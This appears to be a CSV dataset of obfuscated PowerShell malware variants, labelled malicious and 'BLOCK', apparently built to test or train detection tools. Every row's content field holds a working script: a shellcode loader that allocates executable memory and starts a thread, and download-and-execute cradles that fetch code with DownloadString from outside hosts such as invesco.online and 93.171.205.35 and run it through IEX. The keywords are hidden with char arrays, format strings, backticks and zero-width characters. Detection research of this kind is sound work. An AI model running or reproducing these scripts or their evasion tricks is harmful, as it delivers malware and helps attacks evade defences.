variant_id,seed_id,filename,label,target_token,technique_id,family,runtime_target,variant_rank,indicator_family_targeted,indicator_count_before,indicator_count_after,literal_indicator_removed,raw_char_len,used_char_len,was_truncated,viability_status,viability_reason,static_parse_ok,static_invariants_ok,manual_review_required,parent_content_hash,variant_content_hash,content,seed_primary_indicator,candidate_tier,candidate_reason
variant_2e7b1298d4ea,seed_e113e7352dd2,3943__seed_e113e7352dd2__iex_ascii_char_array.ps1,malicious,BLOCK,iex_ascii_char_array,string_construction,cross_runtime,2,IEX,7,5,True,2997,2997,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,2ff1efced81d,8c06e22c0cd9,"$Wef = '$IED = ''[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $IED -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x26,0x6c,0xc9,0xb6,0xda,0xd4,0xd9,0x74,0x24,0xf4,0x5b,0x2b,0xc9,0xb1,0x57,0x31,0x43,0x15,0x03,0x43,0x15,0x83,0xeb,0xfc,0xe2,0xd3,0x90,0x21,0x34,0x1b,0x69,0xb2,0x59,0x92,0x8c,0x83,0x59,0xc0,0xc5,0xb4,0x69,0x83,0x88,0x38,0x01,0xc1,0x38,0xca,0x67,0xcd,0x4f,0x7b,0xcd,0x2b,0x61,0x7c,0x7e,0x0f,0xe0,0xfe,0x7d,0x43,0xc2,0x3f,0x4e,0x96,0x03,0x07,0xb3,0x5a,0x51,0xd0,0xbf,0xc8,0x46,0x55,0xf5,0xd0,0xed,0x25,0x1b,0x50,0x11,0xfd,0x1a,0x71,0x84,0x75,0x45,0x51,0x26,0x59,0xfd,0xd8,0x30,0xbe,0x38,0x93,0xcb,0x74,0xb6,0x22,0x1a,0x45,0x37,0x88,0x63,0x69,0xca,0xd1,0xa4,0x4e,0x35,0xa4,0xdc,0xac,0xc8,0xbe,0x1a,0xce,0x16,0x4b,0xb9,0x68,0xdc,0xeb,0x65,0x88,0x31,0x6d,0xed,0x86,0xfe,0xfa,0xa9,0x8a,0x01,0x2f,0xc2,0xb7,0x8a,0xce,0x05,0x3e,0xc8,0xf4,0x81,0x1a,0x8a,0x95,0x90,0xc6,0x7d,0xaa,0xc3,0xa8,0x22,0x0e,0x8f,0x45,0x36,0x23,0xd2,0x01,0xa6,0x5e,0x99,0xd1,0x5e,0xd7,0x08,0xbc,0xf7,0x43,0xa3,0x0c,0x7f,0x4d,0x34,0x72,0xaa,0xa0,0xe1,0xdf,0x06,0x91,0x46,0xb3,0xc0,0x2f,0x3f,0x4a,0xb6,0xb0,0x6a,0xff,0xeb,0x24,0x96,0x53,0x5f,0xd0,0xc3,0x42,0x5f,0x20,0x1c,0xe8,0x5f,0x20,0xdc,0xde,0x05,0x65,0x94,0x14,0xfb,0x65,0x74,0x3d,0xac,0xec,0xeb,0x7b,0xad,0x3b,0x9a,0x42,0x01,0xab,0x9d,0x78,0x46,0xaf,0xcd,0x2f,0xd5,0xf8,0xa2,0x99,0xb1,0xed,0x10,0x08,0x79,0x0e,0x4f,0xc2,0x17,0xfa,0x2f,0x83,0x67,0xc9,0xcf,0x53,0xe1,0xcd,0xba,0x57,0xa1,0x67,0x24,0x0e,0x29,0x02,0x1c,0x30,0x2f,0x13,0x75,0x1f,0x63,0xb8,0x25,0xf6,0xeb,0x13,0xcc,0xee,0x90,0x94,0x05,0x8b,0xa7,0x1f,0xac,0xdb,0x52,0x06,0xd8,0x13,0x29,0x1a,0x4f,0x2b,0x87,0x30,0x30,0xbb,0x28,0xd4,0xb0,0x3b,0x41,0xd4,0xb0,0x7b,0x91,0x87,0xd8,0x23,0x35,0x74,0xfc,0x2b,0xe0,0xe9,0xad,0x80,0x82,0xea,0x05,0x4f,0x95,0xd4,0xa9,0x8f,0xc6,0x42,0xc2,0x9d,0x7e,0xe3,0xf0,0x5d,0xab,0x76,0x34,0xd5,0x99,0xf3,0xb2,0x17,0xe1,0x86,0x7d,0x62,0x00,0xd0,0xbe,0xd2,0x22,0x95,0xbf,0x12,0x4d,0x64,0x70,0xd9,0x9c,0xb4,0x43,0x19,0xcf,0x89,0x9b,0x6d,0x21,0xdb,0xee,0xbf,0x3d;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$dyKx=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($dyKx.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$dyKx,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Wef));$vEF = ""-EncodedCommand "";if([IntPtr]::Size -eq 8){$i8Wb = $env:SystemRoot + ""\syswow64\WindowsPowerShell\v1.0\powershell"";&((-join ([char[]](73,69,88)))) ""& $i8Wb $vEF $e""}else{;&((-join ([char[]](73,69,88)))) ""& powershell $vEF $e"";}",-EncodedCommand,strict,parse_valid_and_invariants_ok
variant_717dcbcc6b37,seed_e113e7352dd2,3943__seed_e113e7352dd2__encodedcommand_zero_width_strip.ps1,malicious,BLOCK,encodedcommand_zero_width_strip,string_construction,cross_runtime,3,-EncodedCommand,7,6,True,2989,2989,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,2ff1efced81d,e2b602011904,"$Wef = '$IED = ''[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $IED -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x26,0x6c,0xc9,0xb6,0xda,0xd4,0xd9,0x74,0x24,0xf4,0x5b,0x2b,0xc9,0xb1,0x57,0x31,0x43,0x15,0x03,0x43,0x15,0x83,0xeb,0xfc,0xe2,0xd3,0x90,0x21,0x34,0x1b,0x69,0xb2,0x59,0x92,0x8c,0x83,0x59,0xc0,0xc5,0xb4,0x69,0x83,0x88,0x38,0x01,0xc1,0x38,0xca,0x67,0xcd,0x4f,0x7b,0xcd,0x2b,0x61,0x7c,0x7e,0x0f,0xe0,0xfe,0x7d,0x43,0xc2,0x3f,0x4e,0x96,0x03,0x07,0xb3,0x5a,0x51,0xd0,0xbf,0xc8,0x46,0x55,0xf5,0xd0,0xed,0x25,0x1b,0x50,0x11,0xfd,0x1a,0x71,0x84,0x75,0x45,0x51,0x26,0x59,0xfd,0xd8,0x30,0xbe,0x38,0x93,0xcb,0x74,0xb6,0x22,0x1a,0x45,0x37,0x88,0x63,0x69,0xca,0xd1,0xa4,0x4e,0x35,0xa4,0xdc,0xac,0xc8,0xbe,0x1a,0xce,0x16,0x4b,0xb9,0x68,0xdc,0xeb,0x65,0x88,0x31,0x6d,0xed,0x86,0xfe,0xfa,0xa9,0x8a,0x01,0x2f,0xc2,0xb7,0x8a,0xce,0x05,0x3e,0xc8,0xf4,0x81,0x1a,0x8a,0x95,0x90,0xc6,0x7d,0xaa,0xc3,0xa8,0x22,0x0e,0x8f,0x45,0x36,0x23,0xd2,0x01,0xa6,0x5e,0x99,0xd1,0x5e,0xd7,0x08,0xbc,0xf7,0x43,0xa3,0x0c,0x7f,0x4d,0x34,0x72,0xaa,0xa0,0xe1,0xdf,0x06,0x91,0x46,0xb3,0xc0,0x2f,0x3f,0x4a,0xb6,0xb0,0x6a,0xff,0xeb,0x24,0x96,0x53,0x5f,0xd0,0xc3,0x42,0x5f,0x20,0x1c,0xe8,0x5f,0x20,0xdc,0xde,0x05,0x65,0x94,0x14,0xfb,0x65,0x74,0x3d,0xac,0xec,0xeb,0x7b,0xad,0x3b,0x9a,0x42,0x01,0xab,0x9d,0x78,0x46,0xaf,0xcd,0x2f,0xd5,0xf8,0xa2,0x99,0xb1,0xed,0x10,0x08,0x79,0x0e,0x4f,0xc2,0x17,0xfa,0x2f,0x83,0x67,0xc9,0xcf,0x53,0xe1,0xcd,0xba,0x57,0xa1,0x67,0x24,0x0e,0x29,0x02,0x1c,0x30,0x2f,0x13,0x75,0x1f,0x63,0xb8,0x25,0xf6,0xeb,0x13,0xcc,0xee,0x90,0x94,0x05,0x8b,0xa7,0x1f,0xac,0xdb,0x52,0x06,0xd8,0x13,0x29,0x1a,0x4f,0x2b,0x87,0x30,0x30,0xbb,0x28,0xd4,0xb0,0x3b,0x41,0xd4,0xb0,0x7b,0x91,0x87,0xd8,0x23,0x35,0x74,0xfc,0x2b,0xe0,0xe9,0xad,0x80,0x82,0xea,0x05,0x4f,0x95,0xd4,0xa9,0x8f,0xc6,0x42,0xc2,0x9d,0x7e,0xe3,0xf0,0x5d,0xab,0x76,0x34,0xd5,0x99,0xf3,0xb2,0x17,0xe1,0x86,0x7d,0x62,0x00,0xd0,0xbe,0xd2,0x22,0x95,0xbf,0x12,0x4d,0x64,0x70,0xd9,0x9c,0xb4,0x43,0x19,0xcf,0x89,0x9b,0x6d,0x21,0xdb,0xee,0xbf,0x3d;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$dyKx=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($dyKx.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$dyKx,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Wef));$vEF = (('-'+[char]0x200B+'EncodedCommand').Replace([char]0x200B,''))+' ';if([IntPtr]::Size -eq 8){$i8Wb = $env:SystemRoot + ""\syswow64\WindowsPowerShell\v1.0\powershell"";iex ""& $i8Wb $vEF $e""}else{;iex ""& powershell $vEF $e"";}",-EncodedCommand,strict,parse_valid_and_invariants_ok
variant_7a99980f2374,seed_285f5d043e6d,450__seed_285f5d043e6d__iex_format_string.ps1,malicious,BLOCK,iex_format_string,keyword_hiding,cross_runtime,1,IEX,3,2,True,97,97,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,afb3bc0d2089,1a5169997b13,"&(('{0}{1}' -f 'I','EX')) (new-object net.webclient).downloadstring('https://invesco.online/aaa')",DownloadString,strict,parse_valid_and_invariants_ok
variant_7d189d63c28d,seed_285f5d043e6d,450__seed_285f5d043e6d__iex_ascii_char_array.ps1,malicious,BLOCK,iex_ascii_char_array,string_construction,cross_runtime,2,IEX,3,2,True,103,103,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,afb3bc0d2089,9faecd5b9630,"&((-join ([char[]](73,69,88)))) (new-object net.webclient).downloadstring('https://invesco.online/aaa')",DownloadString,strict,parse_valid_and_invariants_ok
variant_8d2b121d7b61,seed_ed17a1e2d507,3062__seed_ed17a1e2d507__iex_format_string.ps1,malicious,BLOCK,iex_format_string,keyword_hiding,cross_runtime,1,IEX,3,2,True,100,100,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,571c12b307c4,4ceec9af0d76,"&(('{0}{1}' -f 'I','EX')) ((New-Object Net.WebClient).DownloadString('http://93.171.205.35:8080/'));",DownloadString,strict,parse_valid_and_invariants_ok
variant_40f98fbdc669,seed_ed17a1e2d507,3062__seed_ed17a1e2d507__iex_ascii_char_array.ps1,malicious,BLOCK,iex_ascii_char_array,string_construction,cross_runtime,2,IEX,3,2,True,106,106,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,571c12b307c4,84327e1d5fc1,"&((-join ([char[]](73,69,88)))) ((New-Object Net.WebClient).DownloadString('http://93.171.205.35:8080/'));",DownloadString,strict,parse_valid_and_invariants_ok
variant_5d3a9f5a117c,seed_d684039eb859,338__seed_d684039eb859__iex_format_string.ps1,malicious,BLOCK,iex_format_string,keyword_hiding,cross_runtime,1,IEX,3,2,True,100,100,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,0ceeaeb87c8a,205ab582eca0,"&(('{0}{1}' -f 'I','EX')) (New-Object Net.WebClient).DownloadString('http://91.120.23.152/wizz.txt')",DownloadString,strict,parse_valid_and_invariants_ok
variant_1aa0d62639c1,seed_d684039eb859,338__seed_d684039eb859__iex_ascii_char_array.ps1,malicious,BLOCK,iex_ascii_char_array,string_construction,cross_runtime,2,IEX,3,2,True,106,106,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,0ceeaeb87c8a,5b36f0182c97,"&((-join ([char[]](73,69,88)))) (New-Object Net.WebClient).DownloadString('http://91.120.23.152/wizz.txt')",DownloadString,strict,parse_valid_and_invariants_ok
variant_9cfebb50bc5f,seed_c59b1d02106e,3100__seed_c59b1d02106e__iex_format_string.ps1,malicious,BLOCK,iex_format_string,keyword_hiding,cross_runtime,1,IEX,3,2,True,103,103,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,1b1d6c53362b,f352e30a7195,"&(('{0}{1}' -f 'I','EX')) ((new-object net.webclient).downloadstring('http://pmlabs.net/cis/test.jpg'))",DownloadString,strict,parse_valid_and_invariants_ok
variant_c93b824eeab9,seed_c59b1d02106e,3100__seed_c59b1d02106e__iex_ascii_char_array.ps1,malicious,BLOCK,iex_ascii_char_array,string_construction,cross_runtime,2,IEX,3,2,True,109,109,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,1b1d6c53362b,c3542ded1a8a,"&((-join ([char[]](73,69,88)))) ((new-object net.webclient).downloadstring('http://pmlabs.net/cis/test.jpg'))",DownloadString,strict,parse_valid_and_invariants_ok
variant_771c26ab5cd4,seed_d4aff830a1c9,2019__seed_d4aff830a1c9__invoke_expression_backtick_string.ps1,malicious,BLOCK,invoke_expression_backtick_string,keyword_hiding,cross_runtime,1,Invoke-Expression,2,1,True,1179,1179,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,d8b40e6d331b,df12bdb136c8,"&(""Invoke-`Expression"") $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String('lVVNb9pAEL0j8R/2YAlbwRuTRFXbKId8tYpUBYRT9RBycNYD2WJ2qXddSBH/vbMfBhzRNOFi8L438+bNzDKuBNNcCsIKyEQ1J6t2i49JGLCCg9D0UgoBTENOYvhFAl1WEJHV5rSQCsJo7TnzUjJQil4vub6UOZBYAAlEVRSGU59uSYA4fBwekhQ05r4ZnF9dDdutIMvzEqHkjHR6n45o78NHeoKP46PODnrQH94hdi5LbYAn+MFjLw3f3MIi7j/+RPVEPSsNMypAUyXZFLSims0dckOhzNUa1um7NnaEAKVLyGYYs4Z+BZ3ad6E5xrgLWU4fq/EYymbm1GW+eNZw/7ChD4EB/w0XlpDyP2DqcPbspV/xbCKk0pwpOnC4LYOmOiv1jRhL+oUXcJvNwPhx+Xk0WnCRy4UajZwBx0ejEZvlFJbQ2csfQs5LzItvRJ6V+Y2YV8bK3pvQ/Uq/Bv+uIH2CorheAqu00Zi8xFk3uUm6dXwHsNWEMGmz/Rvn1LRbNnCcFgBzKwwEkzkXE+QINFo2jL6DpabninF+7WHt1uIJXQ0b+egAYBpGdr7jXrQyh+QARdTB/YDgtxfEIWR5GJnh90NFf5RcY/hdppkWZYlRN+maJ/0GYqKfIle3Kdds1SkJcimMk8E4KxTgbyRqV1xy6qWTMBZSO2j0yn6bXfX77S+DtV0vZYORgLvO+pgh/o4nmiToAhputh+RcYGJGutQK7eZA6w4N3J33WjizdLh5u2LQWJiDiOn6uDMRjsl7uoxyZ2OBvU+oTSwx9inBxLjjuuMC0V6iZH0iCGm6839ZYK4mlauQc7KvW1tqk66tbSd8aUL11sXCA+VnUVVz+L/L81tIwD7a1X5/r910t40vz7seybY+25o9p/B10hWXmCns373kBf7hrzRCPNivSbOjNoczPMX')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();",Invoke-Expression,strict,parse_valid_and_invariants_ok
variant_d3b8bc53c3bb,seed_d4aff830a1c9,2019__seed_d4aff830a1c9__invoke_expression_format_string.ps1,malicious,BLOCK,invoke_expression_format_string,keyword_hiding,cross_runtime,2,Invoke-Expression,2,1,True,1195,1195,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,d8b40e6d331b,e54475688a3d,"&(('{0}{1}' -f 'Invoke-','Expression')) $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String('lVVNb9pAEL0j8R/2YAlbwRuTRFXbKId8tYpUBYRT9RBycNYD2WJ2qXddSBH/vbMfBhzRNOFi8L438+bNzDKuBNNcCsIKyEQ1J6t2i49JGLCCg9D0UgoBTENOYvhFAl1WEJHV5rSQCsJo7TnzUjJQil4vub6UOZBYAAlEVRSGU59uSYA4fBwekhQ05r4ZnF9dDdutIMvzEqHkjHR6n45o78NHeoKP46PODnrQH94hdi5LbYAn+MFjLw3f3MIi7j/+RPVEPSsNMypAUyXZFLSims0dckOhzNUa1um7NnaEAKVLyGYYs4Z+BZ3ad6E5xrgLWU4fq/EYymbm1GW+eNZw/7ChD4EB/w0XlpDyP2DqcPbspV/xbCKk0pwpOnC4LYOmOiv1jRhL+oUXcJvNwPhx+Xk0WnCRy4UajZwBx0ejEZvlFJbQ2csfQs5LzItvRJ6V+Y2YV8bK3pvQ/Uq/Bv+uIH2CorheAqu00Zi8xFk3uUm6dXwHsNWEMGmz/Rvn1LRbNnCcFgBzKwwEkzkXE+QINFo2jL6DpabninF+7WHt1uIJXQ0b+egAYBpGdr7jXrQyh+QARdTB/YDgtxfEIWR5GJnh90NFf5RcY/hdppkWZYlRN+maJ/0GYqKfIle3Kdds1SkJcimMk8E4KxTgbyRqV1xy6qWTMBZSO2j0yn6bXfX77S+DtV0vZYORgLvO+pgh/o4nmiToAhputh+RcYGJGutQK7eZA6w4N3J33WjizdLh5u2LQWJiDiOn6uDMRjsl7uoxyZ2OBvU+oTSwx9inBxLjjuuMC0V6iZH0iCGm6839ZYK4mlauQc7KvW1tqk66tbSd8aUL11sXCA+VnUVVz+L/L81tIwD7a1X5/r910t40vz7seybY+25o9p/B10hWXmCns373kBf7hrzRCPNivSbOjNoczPMX')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();",Invoke-Expression,strict,parse_valid_and_invariants_ok
